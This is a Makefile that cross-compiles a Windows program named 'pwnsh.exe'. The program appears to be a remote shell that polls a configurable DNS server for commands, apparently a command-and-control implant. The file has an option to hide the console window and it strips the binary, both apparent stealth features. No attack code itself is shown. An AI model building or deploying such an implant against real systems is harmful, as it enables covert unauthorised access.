DNS_SERVER ?= 127.0.0.1
DNS_POLL_INTERVAL ?= 1000
SHOW_CONSOLE ?= 1

CC = x86_64-w64-mingw32-g++
FLAGS = -Wall -Wextra -Werror -Wno-unused-parameter -Wno-unused-variable -Wno-unused-function -Wno-unused-but-set-variable -Wno-unused-value -Wno-unused-label -Wno-unused-result -Wno-unused-local-typedefs \
		-DDNS_SERVER=\"$(DNS_SERVER)\" -DDNS_POLL_INTERVAL=$(DNS_POLL_INTERVAL)
ifeq ($(SHOW_CONSOLE), 0)
FLAGS += -Wl,-subsystem,windows
endif
LIBS = -ldnsapi -lws2_32
CCFLAGS = $(FLAGS) $(LIBS)
SRC = $(wildcard src/*.c)
OBJ = $(SRC:.c=.o)
STRIP = x86_64-w64-mingw32-strip

TARGET = pwnsh.exe

.PHONY: all
all: $(TARGET)

.PHONY: clean
clean:
	rm -f $(OBJ) $(TARGET)

$(TARGET): $(OBJ)
	$(CC) -o $@ $^ $(CCFLAGS)
	$(STRIP) $@

src/%.o: src/%.c
	$(CC) -c -o $@ $< $(CCFLAGS)

.PHONY: compiledb
compiledb: clean
	compiledb make
